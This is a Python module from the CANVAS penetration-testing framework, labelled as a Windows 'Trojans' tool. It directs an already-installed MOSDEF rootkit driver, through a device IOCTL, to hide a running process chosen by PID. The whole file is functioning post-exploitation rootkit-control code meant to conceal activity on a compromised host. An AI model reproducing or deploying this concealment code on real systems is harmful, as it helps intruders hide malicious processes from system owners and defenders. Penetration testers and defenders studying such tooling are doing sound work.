#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from canvasexploit import canvasexploit

# info
NAME = "hideprocessbypid"
VERSION = "1.0"
DESCRIPTION = "Hides a running process from view of the operating system. Uses the process PID (no extension)."
DOCUMENTATION = {}

# properties
PROPERTY={}
PROPERTY['TYPE'] = "Trojans"
PROPERTY['ARCH'] = [ ["Windows"] ]

class theexploit(canvasexploit):
    def __init__(self):
        """ init """

        canvasexploit.__init__(self)
        self.result = ""
        self.name = NAME
        self.command = "hideprocessbypid"
        self.pid = 0
        return

    def getArgs(self):
        """ get args """

        self.pid = self.argsDict.get("pid",self.pid)
        return 

    def hideProcessByPid(self, node):
        """ call hide process through MOSDEF.sys IOCTL """

        
        if "win32api" in node.capabilities and self.pid != 0:
            
            if not "rootkit" in node.capabilities:
                # Test for it
                if node.shell.rootkit_present() == -1:
                    self.log("Rootkit not installed on the current host. Run loadrootkit.")
                    self.setInfo("%s - done (failed)" % NAME)
                    return 0
            
            self.log("Attempting to hide process %d" % int(self.pid))
                    
            # Now that we made it this far, we will attempt
            # to use the service manager to install and get
            # the rootkit running
            GENERIC_READ = 0x80000000
            GENERIC_WRITE= 0x40000000
            OPEN_EXISTING= 0x00000003
                
            file_handle = node.shell.CreateFile("\\\\.\\mosdef",GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0)
            self.log("Driver file handle: %08x" % file_handle)
                
            self.log("Sending IOCTL to MOSDEF rootkit.")
            outbuffer = node.shell.malloc(0x10)
            
            ret = node.shell.DeviceIoControlAddress(file_handle,0x2020,self.pid,len(str(self.pid)),outbuffer,0x10)
            
            if ret == 1:
                self.log("Successfully hid process!")
            else:
                self.log("Unable to hide process")
                self.log("[DEBUG] ret = %d"%ret)
                
        else:
            self.log("%s node type not supported" % node.nodetype)
            ret = 0

        return ret

    def run(self):
        """ main """
        
        self.setInfo("%s (in progress)"%(NAME))
        self.getArgs()

        for node in self.argsDict["passednodes"]:    
            ret = self.hideProcessByPid(node)

        return ret

if __name__=="__main__":
    print "[*] This module is designed to be run from inside of CANVAS."
    
